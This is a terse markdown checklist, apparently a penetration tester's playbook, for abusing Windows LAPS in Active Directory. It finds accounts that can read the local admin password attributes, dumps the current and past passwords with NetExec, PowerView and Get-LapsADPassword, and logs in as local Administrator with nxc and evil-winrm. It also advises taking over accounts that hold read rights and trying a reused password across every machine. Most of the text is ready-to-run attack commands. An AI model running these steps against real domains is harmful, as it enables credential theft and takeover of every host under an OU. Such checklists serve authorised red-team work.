# LAPS Abuse

## Before I start
- [ ] LAPS is deployed: look for ms-Mcs-AdmPwd (legacy) or msLAPS-Password (Windows LAPS) attributes on computer objects
- [ ] An account with read rights on that attribute for some OU — often helpdesk or workstation admins

## Find who can read it
- [ ] BloodHound: the ReadLAPSPassword edge on each computer object
- [ ] PowerView: Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -match 'ms-Mcs-AdmPwd|msLAPS-Password'}

## Read the passwords
nxc ldap <DCIP> -u '<Username>' -p '<Password>' --laps
From a domain host with PowerView:
Get-DomainComputer <TargetHost> -Properties ms-Mcs-AdmPwd
Get-DomainComputer <TargetHost> -Properties 'msLAPS-Password','msLAPS-PasswordHistory'
- [ ] Legacy attribute is plaintext in the LDAP response
- [ ] Windows LAPS may store it encrypted: Get-LapsADPassword -Identity <TargetHost> -AsPlainText decrypts when I hold the right
- [ ] msLAPS-PasswordHistory hands over the PREVIOUS passwords: still valid on boxes that missed rotation

## Use them
nxc smb <TargetIP> -u 'Administrator' -p '<LapsPassword>' --local-auth
evil-winrm -i <TargetIP> -u 'Administrator' -p '<LapsPassword>'
- [ ] Local account, so --local-auth / no domain on the login
- [ ] The delegation is the real target: whoever reads LAPS owns every box under that OU — if I can't read it myself, own someone who can: :Pb acl-abuse
- [ ] Same LAPS password on several machines = broken rotation or a cloned image: try it fleet-wide, then report it
